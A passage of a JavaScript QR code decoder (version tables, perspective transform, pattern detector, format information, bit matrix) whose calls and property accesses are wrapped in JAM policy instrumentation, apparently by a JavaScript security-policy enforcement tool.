  JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [16, 15], JAM.policy.p22), JAM.new(ECB, [14, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [24, JAM.new(Array, [6, 28, 54, 80, 106], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [6, 117], JAM.policy.p22), JAM.new(ECB, [4, 118], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [6, 45], JAM.policy.p22), JAM.new(ECB, [14, 46], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, 
  [11, 24], JAM.policy.p22), JAM.new(ECB, [16, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [30, 16], JAM.policy.p22), JAM.new(ECB, [2, 17], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [25, JAM.new(Array, [6, 32, 58, 84, 110], JAM.policy.p22), JAM.new(ECBlocks, [26, JAM.new(ECB, [8, 106], JAM.policy.p22), JAM.new(ECB, [4, 107], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [8, 47], JAM.policy.p22), JAM.new(ECB, [13, 
  48], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [7, 24], JAM.policy.p22), JAM.new(ECB, [22, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [22, 15], JAM.policy.p22), JAM.new(ECB, [13, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [26, JAM.new(Array, [6, 30, 58, 86, 114], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [10, 114], JAM.policy.p22), JAM.new(ECB, [2, 115], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, 
  [28, JAM.new(ECB, [19, 46], JAM.policy.p22), JAM.new(ECB, [4, 47], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [28, 22], JAM.policy.p22), JAM.new(ECB, [6, 23], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [33, 16], JAM.policy.p22), JAM.new(ECB, [4, 17], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [27, JAM.new(Array, [6, 34, 62, 90, 118], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [8, 122], JAM.policy.p22), 
  JAM.new(ECB, [4, 123], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [22, 45], JAM.policy.p22), JAM.new(ECB, [3, 46], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [8, 23], JAM.policy.p22), JAM.new(ECB, [26, 24], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [12, 15], JAM.policy.p22), JAM.new(ECB, [28, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [28, JAM.new(Array, [6, 26, 50, 74, 98, 122], 
  JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [3, 117], JAM.policy.p22), JAM.new(ECB, [10, 118], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [3, 45], JAM.policy.p22), JAM.new(ECB, [23, 46], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [4, 24], JAM.policy.p22), JAM.new(ECB, [31, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [11, 15], JAM.policy.p22), JAM.new(ECB, [31, 16], JAM.policy.p22)], JAM.policy.p22)], 
  JAM.policy.p22), JAM.new(Version, [29, JAM.new(Array, [6, 30, 54, 78, 102, 126], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [7, 116], JAM.policy.p22), JAM.new(ECB, [7, 117], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [21, 45], JAM.policy.p22), JAM.new(ECB, [7, 46], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [1, 23], JAM.policy.p22), JAM.new(ECB, [37, 24], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [19, 
  15], JAM.policy.p22), JAM.new(ECB, [26, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [30, JAM.new(Array, [6, 26, 52, 78, 104, 130], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [5, 115], JAM.policy.p22), JAM.new(ECB, [10, 116], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [19, 47], JAM.policy.p22), JAM.new(ECB, [10, 48], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [15, 24], JAM.policy.p22), JAM.new(ECB, [25, 
  25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [23, 15], JAM.policy.p22), JAM.new(ECB, [25, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [31, JAM.new(Array, [6, 30, 56, 82, 108, 134], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [13, 115], JAM.policy.p22), JAM.new(ECB, [3, 116], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [2, 46], JAM.policy.p22), JAM.new(ECB, [29, 47], JAM.policy.p22)], JAM.policy.p22), 
  JAM.new(ECBlocks, [30, JAM.new(ECB, [42, 24], JAM.policy.p22), JAM.new(ECB, [1, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [23, 15], JAM.policy.p22), JAM.new(ECB, [28, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [32, JAM.new(Array, [6, 34, 60, 86, 112, 138], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [17, 115], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [10, 46], JAM.policy.p22), JAM.new(ECB, [23, 
  47], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [10, 24], JAM.policy.p22), JAM.new(ECB, [35, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [19, 15], JAM.policy.p22), JAM.new(ECB, [35, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [33, JAM.new(Array, [6, 30, 58, 86, 114, 142], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [17, 115], JAM.policy.p22), JAM.new(ECB, [1, 116], JAM.policy.p22)], JAM.policy.p22), 
  JAM.new(ECBlocks, [28, JAM.new(ECB, [14, 46], JAM.policy.p22), JAM.new(ECB, [21, 47], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [29, 24], JAM.policy.p22), JAM.new(ECB, [19, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [11, 15], JAM.policy.p22), JAM.new(ECB, [46, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [34, JAM.new(Array, [6, 34, 62, 90, 118, 146], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [13, 
  115], JAM.policy.p22), JAM.new(ECB, [6, 116], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [14, 46], JAM.policy.p22), JAM.new(ECB, [23, 47], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [44, 24], JAM.policy.p22), JAM.new(ECB, [7, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [59, 16], JAM.policy.p22), JAM.new(ECB, [1, 17], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [35, JAM.new(Array, [6, 
  30, 54, 78, 102, 126, 150], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [12, 121], JAM.policy.p22), JAM.new(ECB, [7, 122], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [12, 47], JAM.policy.p22), JAM.new(ECB, [26, 48], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [39, 24], JAM.policy.p22), JAM.new(ECB, [14, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [22, 15], JAM.policy.p22), JAM.new(ECB, [41, 16], JAM.policy.p22)], 
  JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [36, JAM.new(Array, [6, 24, 50, 76, 102, 128, 154], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [6, 121], JAM.policy.p22), JAM.new(ECB, [14, 122], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [6, 47], JAM.policy.p22), JAM.new(ECB, [34, 48], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [46, 24], JAM.policy.p22), JAM.new(ECB, [10, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, 
  [30, JAM.new(ECB, [2, 15], JAM.policy.p22), JAM.new(ECB, [64, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [37, JAM.new(Array, [6, 28, 54, 80, 106, 132, 158], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [17, 122], JAM.policy.p22), JAM.new(ECB, [4, 123], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [29, 46], JAM.policy.p22), JAM.new(ECB, [14, 47], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [49, 24], JAM.policy.p22), 
  JAM.new(ECB, [10, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [24, 15], JAM.policy.p22), JAM.new(ECB, [46, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [38, JAM.new(Array, [6, 32, 58, 84, 110, 136, 162], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [4, 122], JAM.policy.p22), JAM.new(ECB, [18, 123], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [13, 46], JAM.policy.p22), JAM.new(ECB, [32, 47], JAM.policy.p22)], 
  JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [48, 24], JAM.policy.p22), JAM.new(ECB, [14, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [42, 15], JAM.policy.p22), JAM.new(ECB, [32, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [39, JAM.new(Array, [6, 26, 54, 82, 110, 138, 166], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [20, 117], JAM.policy.p22), JAM.new(ECB, [4, 118], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, 
  [28, JAM.new(ECB, [40, 47], JAM.policy.p22), JAM.new(ECB, [7, 48], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [43, 24], JAM.policy.p22), JAM.new(ECB, [22, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [10, 15], JAM.policy.p22), JAM.new(ECB, [67, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22), JAM.new(Version, [40, JAM.new(Array, [6, 30, 58, 86, 114, 142, 170], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [19, 118], JAM.policy.p22), 
  JAM.new(ECB, [6, 119], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [28, JAM.new(ECB, [18, 47], JAM.policy.p22), JAM.new(ECB, [31, 48], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [34, 24], JAM.policy.p22), JAM.new(ECB, [34, 25], JAM.policy.p22)], JAM.policy.p22), JAM.new(ECBlocks, [30, JAM.new(ECB, [20, 15], JAM.policy.p22), JAM.new(ECB, [61, 16], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p22)], JAM.policy.p38);
}
function PerspectiveTransform(a11, a21, a31, a12, a22, a32, a13$$1, a23$$1, a33) {
  function v15(other$$4) {
    return JAM.new(PerspectiveTransform, [this.a11 * other$$4.a11 + this.a21 * other$$4.a12 + this.a31 * other$$4.a13, this.a11 * other$$4.a21 + this.a21 * other$$4.a22 + this.a31 * other$$4.a23, this.a11 * other$$4.a31 + this.a21 * other$$4.a32 + this.a31 * other$$4.a33, this.a12 * other$$4.a11 + this.a22 * other$$4.a12 + this.a32 * other$$4.a13, this.a12 * other$$4.a21 + this.a22 * other$$4.a22 + this.a32 * other$$4.a23, this.a12 * other$$4.a31 + this.a22 * other$$4.a32 + this.a32 * other$$4.a33, 
    this.a13 * other$$4.a11 + this.a23 * other$$4.a12 + this.a33 * other$$4.a13, this.a13 * other$$4.a21 + this.a23 * other$$4.a22 + this.a33 * other$$4.a23, this.a13 * other$$4.a31 + this.a23 * other$$4.a32 + this.a33 * other$$4.a33], JAM.policy.p38);
  }
  function v14() {
    return JAM.new(PerspectiveTransform, [this.a22 * this.a33 - this.a23 * this.a32, this.a23 * this.a31 - this.a21 * this.a33, this.a21 * this.a32 - this.a22 * this.a31, this.a13 * this.a32 - this.a12 * this.a33, this.a11 * this.a33 - this.a13 * this.a31, this.a12 * this.a31 - this.a11 * this.a32, this.a12 * this.a23 - this.a13 * this.a22, this.a13 * this.a21 - this.a11 * this.a23, this.a11 * this.a22 - this.a12 * this.a21], JAM.policy.p38);
  }
  function v13(xValues, yValues) {
    var n$$1 = xValues.length;
    var i$$6 = 0;
    var v444 = i$$6 < n$$1;
    for (;v444;) {
      introspect(JAM.policy.p26) {
        var x$$51 = xValues[i$$6]
      }
      introspect(JAM.policy.p26) {
        var y$$34 = yValues[i$$6]
      }
      var denominator$$2 = this.a13 * x$$51 + this.a23 * y$$34 + this.a33;
      var v442 = this.a11 * x$$51 + this.a21 * y$$34 + this.a31;
      introspect(JAM.policy.p27) {
        xValues[i$$6] = v442 / denominator$$2;
      }
      var v443 = this.a12 * x$$51 + this.a22 * y$$34 + this.a32;
      introspect(JAM.policy.p27) {
        yValues[i$$6] = v443 / denominator$$2;
      }
      i$$6 = i$$6 + 1;
      v444 = i$$6 < n$$1;
    }
    return;
  }
  function v12(points$$2) {
    var max$$2 = points$$2.length;
    var a11$$1 = this.a11;
    var a12$$1 = this.a12;
    var a13$$2 = this.a13;
    var a21$$1 = this.a21;
    var a22$$1 = this.a22;
    var a23$$2 = this.a23;
    var a31$$1 = this.a31;
    var a32$$1 = this.a32;
    var a33$$1 = this.a33;
    var i$$5 = 0;
    var v449 = i$$5 < max$$2;
    for (;v449;) {
      introspect(JAM.policy.p26) {
        var x$$50 = points$$2[i$$5]
      }
      var v445 = i$$5 + 1;
      introspect(JAM.policy.p26) {
        var y$$33 = points$$2[v445]
      }
      var denominator$$1 = a13$$2 * x$$50 + a23$$2 * y$$33 + a33$$1;
      var v447 = a11$$1 * x$$50 + a21$$1 * y$$33 + a31$$1;
      introspect(JAM.policy.p27) {
        points$$2[i$$5] = v447 / denominator$$1;
      }
      var v448 = i$$5 + 1;
      var v1462 = a12$$1 * x$$50 + a22$$1 * y$$33 + a32$$1;
      introspect(JAM.policy.p27) {
        points$$2[v448] = v1462 / denominator$$1;
      }
      i$$5 = i$$5 + 2;
      v449 = i$$5 < max$$2;
    }
    return;
  }
  this.a11 = a11;
  this.a12 = a12;
  this.a13 = a13$$1;
  this.a21 = a21;
  this.a22 = a22;
  this.a23 = a23$$1;
  this.a31 = a31;
  this.a32 = a32;
  this.a33 = a33;
  this.transformPoints1 = v12;
  this.transformPoints2 = v13;
  this.buildAdjoint = v14;
  this.times = v15;
  return;
}
function DetectorResult(bits$$1, points$$3) {
  this.bits = bits$$1;
  this.points = points$$3;
  return;
}
function Detector(image$$5) {
  function v26() {
    var v450 = JAM.new(FinderPatternFinder, [], JAM.policy.p40);
    var info$$1 = JAM.call(v450.findFinderPattern, v450, [this.image], JAM.policy.p39);
    return JAM.call(this.processFinderPatternInfo, this, [info$$1], JAM.policy.p39);
  }
  function v25(info) {
    var topLeft$$3 = info.TopLeft;
    var topRight$$3 = info.TopRight;
    var bottomLeft$$3 = info.BottomLeft;
    var moduleSize$$1 = JAM.call(this.calculateModuleSize, this, [topLeft$$3, topRight$$3, bottomLeft$$3], JAM.policy.p38);
    if (moduleSize$$1 < 1) {
      throw "Error";
    }
    var dimension$$7 = JAM.call(this.computeDimension, this, [topLeft$$3, topRight$$3, bottomLeft$$3, moduleSize$$1], JAM.policy.p38);
    var provisionalVersion = JAM.call(Version.getProvisionalVersionForDimension, Version, [dimension$$7], JAM.policy.p39);
    var modulesBetweenFPCenters = provisionalVersion.DimensionForVersion - 7;
    var alignmentPattern$$1 = null;
    if (provisionalVersion.AlignmentPatternCenters.length > 0) {
      var bottomRightX$$1 = topRight$$3.X - topLeft$$3.X + bottomLeft$$3.X;
      var bottomRightY$$1 = topRight$$3.Y - topLeft$$3.Y + bottomLeft$$3.Y;
      var correctionToTopLeft = 1 - 3 / modulesBetweenFPCenters;
      var estAlignmentX$$1 = JAM.call(Math.floor, Math, [topLeft$$3.X + correctionToTopLeft * (bottomRightX$$1 - topLeft$$3.X)], JAM.policy.p39);
      var estAlignmentY$$1 = JAM.call(Math.floor, Math, [topLeft$$3.Y + correctionToTopLeft * (bottomRightY$$1 - topLeft$$3.Y)], JAM.policy.p39);
      var i$$7 = 4;
      var v461 = i$$7 <= 16;
      for (;v461;) {
        alignmentPattern$$1 = JAM.call(this.findAlignmentInRegion, this, [moduleSize$$1, estAlignmentX$$1, estAlignmentY$$1, i$$7], JAM.policy.p38);
        break;
      }
    }
    var transform$$4 = JAM.call(this.createTransform, this, [topLeft$$3, topRight$$3, bottomLeft$$3, alignmentPattern$$1, dimension$$7], JAM.policy.p38);
    var bits$$2 = JAM.call(this.sampleGrid, this, [this.image, transform$$4, dimension$$7], JAM.policy.p38);
    var points$$4;
    if (alignmentPattern$$1 === null) {
      points$$4 = JAM.new(Array, [bottomLeft$$3, topLeft$$3, topRight$$3], JAM.policy.p38);
    } else {
      points$$4 = JAM.new(Array, [bottomLeft$$3, topLeft$$3, topRight$$3, alignmentPattern$$1], JAM.policy.p38);
    }
    return JAM.new(DetectorResult, [bits$$2, points$$4], JAM.policy.p38);
  }
  function v24(image$$6, transform$$3, dimension$$6) {
    var sampler = GridSampler;
    return JAM.call(sampler.sampleGrid3, sampler, [image$$6, dimension$$6, transform$$3], JAM.policy.p38);
  }
  function v23(topLeft$$2, topRight$$2, bottomLeft$$2, alignmentPattern, dimension$$5) {
    var dimMinusThree = dimension$$5 - 3.5;
    var bottomRightX;
    var bottomRightY;
    var sourceBottomRightX;
    var sourceBottomRightY;
    if (alignmentPattern !== null) {
      bottomRightX = alignmentPattern.X;
      bottomRightY = alignmentPattern.Y;
      sourceBottomRightX = sourceBottomRightY = dimMinusThree - 3;
    } else {
      bottomRightX = topRight$$2.X - topLeft$$2.X + bottomLeft$$2.X;
      bottomRightY = topRight$$2.Y - topLeft$$2.Y + bottomLeft$$2.Y;
      sourceBottomRightX = sourceBottomRightY = dimMinusThree;
    }
    var transform$$2 = JAM.call(PerspectiveTransform.quadrilateralToQuadrilateral, PerspectiveTransform, [3.5, 3.5, dimMinusThree, 3.5, sourceBottomRightX, sourceBottomRightY, 3.5, dimMinusThree, topLeft$$2.X, topLeft$$2.Y, topRight$$2.X, topRight$$2.Y, bottomRightX, bottomRightY, bottomLeft$$2.X, bottomLeft$$2.Y], JAM.policy.p22);
    return transform$$2;
  }
  function v22(overallEstModuleSize, estAlignmentX, estAlignmentY, allowanceFactor) {
    var allowance = JAM.call(Math.floor, Math, [allowanceFactor * overallEstModuleSize], JAM.policy.p39);
    var alignmentAreaLeftX = JAM.call(Math.max, Math, [0, estAlignmentX - allowance], JAM.policy.p22);
    var alignmentAreaRightX = JAM.call(Math.min, Math, [qrcode.width - 1, estAlignmentX + allowance], JAM.policy.p38);
    if (alignmentAreaRightX - alignmentAreaLeftX < overallEstModuleSize * 3) {
      throw "Error";
    }
    var alignmentAreaTopY = JAM.call(Math.max, Math, [0, estAlignmentY - allowance], JAM.policy.p22);
    var alignmentAreaBottomY = JAM.call(Math.min, Math, [qrcode.height - 1, estAlignmentY + allowance], JAM.policy.p38);
    var alignmentFinder = JAM.new(AlignmentPatternFinder, [this.image, alignmentAreaLeftX, alignmentAreaTopY, alignmentAreaRightX - alignmentAreaLeftX, alignmentAreaBottomY - alignmentAreaTopY, overallEstModuleSize, this.resultPointCallback], JAM.policy.p38);
    return JAM.call(alignmentFinder.find, alignmentFinder, [], JAM.policy.p40);
  }
  function v21(topLeft$$1, topRight$$1, bottomLeft$$1, moduleSize) {
    var tltrCentersDimension = JAM.call(Math.round, Math, [JAM.call(this.distance, this, [topLeft$$1, topRight$$1], JAM.policy.p38) / moduleSize], JAM.policy.p39);
    var tlblCentersDimension = JAM.call(Math.round, Math, [JAM.call(this.distance, this, [topLeft$$1, bottomLeft$$1], JAM.policy.p38) / moduleSize], JAM.policy.p39);
    var dimension$$4 = (tltrCentersDimension + tlblCentersDimension >> 1) + 7;
    switch(dimension$$4 & 3) {
      case 0:
        dimension$$4 = dimension$$4 + 1;
        break;
      case 2:
        dimension$$4 = dimension$$4 - 1;
        break;
      case 3:
        throw "Error";;
    }
    return dimension$$4;
  }
  function v20(pattern1, pattern2) {
    xDiff = pattern1.X - pattern2.X;
    yDiff = pattern1.Y - pattern2.Y;
    return JAM.call(Math.sqrt, Math, [xDiff * xDiff + yDiff * yDiff], JAM.policy.p39);
  }
  function v19(topLeft, topRight, bottomLeft) {
    return(JAM.call(this.calculateModuleSizeOneWay, this, [topLeft, topRight], JAM.policy.p38) + JAM.call(this.calculateModuleSizeOneWay, this, [topLeft, bottomLeft], JAM.policy.p38)) / 2;
  }
  function v18(pattern$$1, otherPattern) {
    var moduleSizeEst1 = JAM.call(this.sizeOfBlackWhiteBlackRunBothWays, this, [JAM.call(Math.floor, Math, [pattern$$1.X], JAM.policy.p39), JAM.call(Math.floor, Math, [pattern$$1.Y], JAM.policy.p39), JAM.call(Math.floor, Math, [otherPattern.X], JAM.policy.p39), JAM.call(Math.floor, Math, [otherPattern.Y], JAM.policy.p39)], JAM.policy.p38);
    var moduleSizeEst2 = JAM.call(this.sizeOfBlackWhiteBlackRunBothWays, this, [JAM.call(Math.floor, Math, [otherPattern.X], JAM.policy.p39), JAM.call(Math.floor, Math, [otherPattern.Y], JAM.policy.p39), JAM.call(Math.floor, Math, [pattern$$1.X], JAM.policy.p39), JAM.call(Math.floor, Math, [pattern$$1.Y], JAM.policy.p39)], JAM.policy.p38);
    if (JAM.call(isNaN, null, [moduleSizeEst1], JAM.policy.p39)) {
      return moduleSizeEst2 / 7;
    }
    if (JAM.call(isNaN, null, [moduleSizeEst2], JAM.policy.p39)) {
      return moduleSizeEst1 / 7;
    }
    return(moduleSizeEst1 + moduleSizeEst2) / 14;
  }
  function v17(fromX$$1, fromY$$1, toX$$1, toY$$1) {
    var result = JAM.call(this.sizeOfBlackWhiteBlackRun, this, [fromX$$1, fromY$$1, toX$$1, toY$$1], JAM.policy.p38);
    var scale = 1;
    var otherToX = fromX$$1 - (toX$$1 - fromX$$1);
    if (otherToX < 0) {
      scale = fromX$$1 / (fromX$$1 - otherToX);
      otherToX = 0;
    } else {
      if (otherToX >= qrcode.width) {
        scale = (qrcode.width - 1 - fromX$$1) / (otherToX - fromX$$1);
        otherToX = qrcode.width - 1;
      }
    }
    var otherToY = JAM.call(Math.floor, Math, [fromY$$1 - (toY$$1 - fromY$$1) * scale], JAM.policy.p39);
    scale = 1;
    if (otherToY < 0) {
      scale = fromY$$1 / (fromY$$1 - otherToY);
      otherToY = 0;
    } else {
      if (otherToY >= qrcode.height) {
        scale = (qrcode.height - 1 - fromY$$1) / (otherToY - fromY$$1);
        otherToY = qrcode.height - 1;
      }
    }
    otherToX = JAM.call(Math.floor, Math, [fromX$$1 + (otherToX - fromX$$1) * scale], JAM.policy.p39);
    result = result + JAM.call(this.sizeOfBlackWhiteBlackRun, this, [fromX$$1, fromY$$1, otherToX, otherToY], JAM.policy.p38);
    return result - 1;
  }
  function v16(fromX, fromY, toX, toY) {
    var steep = JAM.call(Math.abs, Math, [toY - fromY], JAM.policy.p39) > JAM.call(Math.abs, Math, [toX - fromX], JAM.policy.p39);
    if (steep) {
      var temp = fromX;
      fromX = fromY;
      fromY = temp;
      temp = toX;
      toX = toY;
      toY = temp;
    }
    var dx$$4 = JAM.call(Math.abs, Math, [toX - fromX], JAM.policy.p39);
    var dy$$4 = JAM.call(Math.abs, Math, [toY - fromY], JAM.policy.p39);
    var error$$1 = -dx$$4 >> 1;
    var v529;
    if (fromY < toY) {
      v529 = 1;
    } else {
      v529 = -1;
    }
    var ystep = v529;
    var v530;
    if (fromX < toX) {
      v530 = 1;
    } else {
      v530 = -1;
    }
    var xstep = v530;
    var state = 0;
    var x$$52 = fromX;
    var y$$35 = fromY;
    var v540 = x$$52 !== toX;
    for (;v540;) {
      var v531;
      if (steep) {
        v531 = y$$35;
      } else {
        v531 = x$$52;
      }
      var realX = v531;
      var v532;
      if (steep) {
        v532 = x$$52;
      } else {
        v532 = y$$35;
      }
      var realY = v532;
      if (state === 1) {
        var v1507 = this.image;
        var v1508 = realX + realY * qrcode.width;
        introspect(JAM.policy.p26) {
          var v533 = v1507[v1508]
        }
        if (v533) {
          state = state + 1;
        }
      } else {
        var v2290 = this.image;
        var v2291 = realX + realY * qrcode.width;
        introspect(JAM.policy.p26) {
          var v1509 = v2290[v2291]
        }
        if (!v1509) {
          state = state + 1;
        }
      }
      if (state === 3) {
        var diffX = x$$52 - fromX;
        var diffY = y$$35 - fromY;
        return JAM.call(Math.sqrt, Math, [diffX * diffX + diffY * diffY], JAM.policy.p39);
      }
      error$$1 = error$$1 + dy$$4;
      if (error$$1 > 0) {
        if (y$$35 === toY) {
          break;
        }
        y$$35 = y$$35 + ystep;
        error$$1 = error$$1 - dx$$4;
      }
      x$$52 = x$$52 + xstep;
      v540 = x$$52 !== toX;
    }
    var diffX2 = toX - fromX;
    var diffY2 = toY - fromY;
    return JAM.call(Math.sqrt, Math, [diffX2 * diffX2 + diffY2 * diffY2], JAM.policy.p39);
  }
  this.image = image$$5;
  this.resultPointCallback = null;
  this.sizeOfBlackWhiteBlackRun = v16;
  this.sizeOfBlackWhiteBlackRunBothWays = v17;
  this.calculateModuleSizeOneWay = v18;
  this.calculateModuleSize = v19;
  this.distance = v20;
  this.computeDimension = v21;
  this.findAlignmentInRegion = v22;
  this.createTransform = v23;
  this.sampleGrid = v24;
  this.processFinderPatternInfo = v25;
  this.detect = v26;
  return;
}
function FormatInformation(formatInfo) {
  function v30(o) {
    var other$$5 = o;
    var v542 = this.errorCorrectionLevel === other$$5.errorCorrectionLevel;
    if (v542) {
      v542 = this.dataMask === other$$5.dataMask;
    }
    return v542;
  }
  function v29() {
    return this.errorCorrectionLevel.ordinal_Renamed_Field << 3 | dataMask;
  }
  function v28() {
    return this.dataMask;
  }
  function v27() {
    return this.errorCorrectionLevel;
  }
  var v2853 = JAM.call(ErrorCorrectionLevel.forBits, ErrorCorrectionLevel, [formatInfo >> 3 & 3], JAM.policy.p39);
  this.errorCorrectionLevel = v2853;
  this.dataMask = formatInfo & 7;
  JAM.call(this.__defineGetter__, this, ["ErrorCorrectionLevel", v27], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["DataMask", v28], JAM.policy.p23);
  this.GetHashCode = v29;
  this.Equals = v30;
  return;
}
function ErrorCorrectionLevel(ordinal, bits$$3, name$$30) {
  function v33() {
    return this.ordinal_Renamed_Field;
  }
  function v32() {
    return this.name;
  }
  function v31() {
    return this.bits;
  }
  this.ordinal_Renamed_Field = ordinal;
  this.bits = bits$$3;
  this.name = name$$30;
  JAM.call(this.__defineGetter__, this, ["Bits", v31], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["Name", v32], JAM.policy.p23);
  this.ordinal = v33;
  return;
}
function BitMatrix(width$$10, height$$9) {
  function v41(left$$1, top$$1, width$$11, height$$10) {
    var v1520 = top$$1 < 0;
    if (!v1520) {
      v1520 = left$$1 < 0;
    }
    if (v1520) {
      throw "Left and top must be nonnegative";
    }
    var v1521 = height$$10 < 1;
    if (!v1521) {
      v1521 = width$$11 < 1;
    }
    if (v1521) {
      throw "Height and width must be at least 1";
    }
    var right$$1 = left$$1 + width$$11;
    var bottom = top$$1 + height$$10;
    var v1522 = bottom > this.height;
    if (!v1522) {
      v1522 = right$$1 > this.width;
    }
    if (v1522) {
      throw "The region must fit inside the matrix";
    }
    var y$$39 = top$$1;
    var v552 = y$$39 < bottom;
    for (;v552;) {
      var offset$$12 = y$$39 * this.rowSize;
